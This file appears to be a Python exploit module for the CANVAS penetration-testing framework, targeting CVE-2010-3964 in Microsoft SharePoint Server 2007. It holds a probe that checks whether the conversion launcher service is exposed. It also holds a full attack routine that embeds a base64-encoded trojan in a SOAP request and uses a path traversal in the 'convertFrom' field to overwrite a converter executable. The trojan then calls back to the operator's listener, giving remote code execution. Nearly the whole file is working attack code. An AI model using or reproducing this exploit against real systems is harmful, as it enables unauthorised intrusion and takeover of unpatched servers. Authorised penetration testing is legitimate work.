import sys
if "." not in sys.path:
    sys.path.append(".")

import canvasengine
import base64
import httplib
from exploitutils import *
from tcpexploit import *
from libs.canvasos import *


NAME                           = "Microsoft SharePoint Server 2007 Arbitrary File Upload RCE"
DESCRIPTION                    = "Microsoft SharePoint Server 2007 Arbitrary File Upload RCE"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "Microsoft"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["CVE Name"]      = "CVE-2010-3964"
DOCUMENTATION["CVE Url"]       = "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-3964"
DOCUMENTATION['CVSS']          = 7.5

VERSION                        = "1.0"

PROPERTY                       = {}
PROPERTY['TYPE']               = "Exploit"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [["Windows"]]
PROPERTY['VERSION']            = ['All']

CHANGELOG                      = """

"""

NOTES                          = """

Tested on Microsoft Sharepoint Server 2007 on Windows 2008 R2

"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setPort(8082)
        self.setHost('')
        self.setVersion(1)
        self.badstring=""
        self.name=NAME

    def getargs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get('port', self.port))
        self.arch = self.argsDict.get('arch')

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def createShellcode(self):
        return None

    def test(self):
        self.getargs()

        content = """<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <SOAP-ENV:Header>
        <h4:__CallContext href="#ref-3" xmlns:h4="http://schemas.microsoft.com/clr/soap/messageProperties" SOAP-ENC:root="1"/>
        <a1:LogicalCallContext id="ref-3" xmlns:a1="http://schemas.microsoft.com/clr/ns/System.Runtime.Remoting.Messaging">
        <E2ETrace.ActivityID xsi:type="a2:Guid" xmlns:a2="http://schemas.microsoft.com/clr/ns/System">
        <_a>0</_a>
        <_b>0</_b>
        <_c>0</_c>
        <_d>27</_d>
        <_e>3</_e>
        <_f>0</_f>
        <_g>128</_g>
        <_h>0</_h>
        <_i>0</_i>
        <_j>0</_j>
        <_k>238</_k>
        </E2ETrace.ActivityID>
        </a1:LogicalCallContext>
        </SOAP-ENV:Header>
        <SOAP-ENV:Body>
        <i5:ConvertFile id="ref-1" xmlns:i5="http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface">
        <launcherUri id="ref-6">http://HOST:PORT/HtmlTrLauncher</launcherUri>
        <appExe id="ref-7">DocXPageConverter.exe</appExe>
        <convertFrom id="ref-8">docx</convertFrom>
        <convertTo id="ref-9">html</convertTo>
        <fileBits href="#ref-10"/>
        <taskName id="ref-11">empty.docxdoctrans</taskName>
        <configInfo id="ref-12">&#60;RcaTransformation&#62;&#60;ConverterSettings SourceDocLibUrl=&#34;/Docs/Documents&#34;&#62;&#60;/ConverterSettings&#62;&#60;TransformationContext&#62;&#60;TransformationStateStore xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34;&#62;&#60;IsUpdate&#62;false&#60;/IsUpdate&#62;&#60;LayoutBodyFieldId&#62;f55c4d88-1f2e-4ad9-aaa8-819af4ee7ee8&#60;/LayoutBodyFieldId&#62;&#60;LayoutStylesFieldId&#62;a932ec3f-94c1-48b1-b6dc-41aaa6eb7e54&#60;/LayoutStylesFieldId&#62;&#60;PageSiteId&#62;58bae916-c04a-4855-b737-5399c3d8eca4&#60;/PageSiteId&#62;&#60;PageWebId&#62;7477f6ab-0b45-48c4-9a07-115f70a5689c&#60;/PageWebId&#62;&#60;PageUrl&#62;Pages/empty.aspx&#60;/PageUrl&#62;&#60;/TransformationStateStore&#62;&#60;/TransformationContext&#62;&#60;/RcaTransformation&#62;</configInfo>
        <timeout>300</timeout>
        <fReturnFileBits>true</fReturnFileBits>
        </i5:ConvertFile>
        <SOAP-ENC:Array id="ref-10" xsi:type="SOAP-ENC:base64"></SOAP-ENC:Array>
        </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>
        """

        content = content.replace('PORT',str(self.port))
        hostname = socket.gethostbyaddr(self.host)[0]
        content = content.replace('HOST',hostname)

        addr = self.host + ':' + str(self.port)
        conn = httplib.HTTP(addr)
        conn.putrequest("POST", "/HtmlTrLauncher")
        conn.putheader("Content-type", 'text/xml; charset="utf-8"')
        conn.putheader("User-Agent", "Mozilla/4.0+(compatible; MSIE 6.0; Windows 6.1.7601.65536; MS .NET Remoting; MS .NET CLR 2.0.50727.5420 )")
        conn.putheader("SOAPAction", "http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface#ConvertFile")
        conn.putheader("Host", addr)
        conn.putheader("Content-length", "%d" % len(content))
        conn.endheaders()
        conn.send(content)

        statuscode, statusmessage, header = conn.getreply()
        res = conn.getfile().read()

        if 'CE_OTHER' in res and statuscode == 200:
            return 0
        else:
            return 1

    def run(self):
        """
        Actually exploit the target.
        """
        self.getargs()

        content = """<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Header>
<h4:__CallContext href="#ref-3" xmlns:h4="http://schemas.microsoft.com/clr/soap/messageProperties" SOAP-ENC:root="1"/>
<a1:LogicalCallContext id="ref-3" xmlns:a1="http://schemas.microsoft.com/clr/ns/System.Runtime.Remoting.Messaging">
<E2ETrace.ActivityID xsi:type="a2:Guid" xmlns:a2="http://schemas.microsoft.com/clr/ns/System">
<_a>0</_a>
<_b>0</_b>
<_c>0</_c>
<_d>27</_d>
<_e>3</_e>
<_f>0</_f>
<_g>128</_g>
<_h>0</_h>
<_i>0</_i>
<_j>0</_j>
<_k>238</_k>
</E2ETrace.ActivityID>
</a1:LogicalCallContext>
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<i5:ConvertFile id="ref-1" xmlns:i5="http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface">
<launcherUri id="ref-6">http://HOST:PORT/HtmlTrLauncher</launcherUri>
<appExe id="ref-7">PdfPageConverter.exe</appExe>
<convertFrom id="ref-8">..\\..\\..\\..\\TransformApps\\PdfPageConverter.exe</convertFrom>
<convertTo id="ref-9">html</convertTo>
<fileBits href="#ref-10"/>
<taskName id="ref-11">empty.docxdoctrans</taskName>
<configInfo id="ref-12">&#60;RcaTransformation&#62;&#60;ConverterSettings SourceDocLibUrl=&#34;/Docs/Documents&#34;&#62;&#60;/ConverterSettings&#62;&#60;TransformationContext&#62;&#60;TransformationStateStore xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34;&#62;&#60;IsUpdate&#62;false&#60;/IsUpdate&#62;&#60;LayoutBodyFieldId&#62;f55c4d88-1f2e-4ad9-aaa8-819af4ee7ee8&#60;/LayoutBodyFieldId&#62;&#60;LayoutStylesFieldId&#62;a932ec3f-94c1-48b1-b6dc-41aaa6eb7e54&#60;/LayoutStylesFieldId&#62;&#60;PageSiteId&#62;58bae916-c04a-4855-b737-5399c3d8eca4&#60;/PageSiteId&#62;&#60;PageWebId&#62;7477f6ab-0b45-48c4-9a07-115f70a5689c&#60;/PageWebId&#62;&#60;PageUrl&#62;Pages/empty.aspx&#60;/PageUrl&#62;&#60;/TransformationStateStore&#62;&#60;/TransformationContext&#62;&#60;/RcaTransformation&#62;</configInfo>
<timeout>300</timeout>
<fReturnFileBits>true</fReturnFileBits>
</i5:ConvertFile>
<SOAP-ENC:Array id="ref-10" xsi:type="SOAP-ENC:base64">SHELLCODE</SOAP-ENC:Array>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
"""
        t_os        = canvasos('Windows')
        t_os.arch   = self.arch
        self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=t_os, http=False, ssl=False, universal=True, encrypted=False)

        trojan = base64.b64encode(self.mosdeftrojan)
        content = content.replace('PORT',str(self.port))
        hostname = socket.gethostbyaddr(self.host)[0]
        content = content.replace('HOST',hostname)
        content = content.replace('SHELLCODE',trojan)

        addr = self.host + ':' + str(self.port)
        conn = httplib.HTTP(addr)
        conn.putrequest("POST", "/HtmlTrLauncher")
        conn.putheader("Content-type", 'text/xml; charset="utf-8"')
        conn.putheader("User-Agent", "Mozilla/4.0+(compatible; MSIE 6.0; Windows 6.1.7601.65536; MS .NET Remoting; MS .NET CLR 2.0.50727.5420 )")
        conn.putheader("SOAPAction", "http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface#ConvertFile")
        conn.putheader("Host", addr)
        conn.putheader("Content-length", "%d" % len(content))
        conn.endheaders()
        conn.send(content)

if __name__ == '__main__':
    print "Running CANVAS " + NAME + " version " + VERSION
    app = theexploit()
    ret = standard_callback_commandline(app)

